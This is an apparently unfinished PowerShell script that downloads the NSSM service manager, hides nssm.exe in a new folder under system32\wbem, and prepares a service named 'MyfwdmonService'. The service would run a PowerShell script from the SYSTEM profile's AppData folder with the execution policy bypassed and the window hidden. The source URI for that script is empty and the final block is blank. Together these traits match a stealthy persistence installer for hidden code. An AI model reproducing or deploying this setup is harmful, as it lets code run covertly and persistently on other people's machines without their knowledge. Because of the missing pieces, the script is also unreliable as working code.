$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local"
)

$nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$fwdmonUri = ""
$fwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$fwdmonPath = "$fwdmonPath\fwd_mon.ps1"
$serviceName = "MyfwdmonService"
$exepath = "powershell.exe"
$arguments = "-ep bypass -nop -w hidden $fwdmonPath"
$downloadPath = "$env:temp\nssm.zip"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    if(-not(Test-Path -Path $downloadPath)){
        iwr -Uri $nssmUrl -OutFile $downloadPath
    }
    Expand-Archive -Path $downloadPath -DestinationPath $env:temp
    Move-Item -Path "$env:temp\nssm-2.24\win64\nssm.exe" -Destination $nssmexe -Force
}

if(-not(Test-Path -Path $fwdmonPath -PathType Leaf)){

}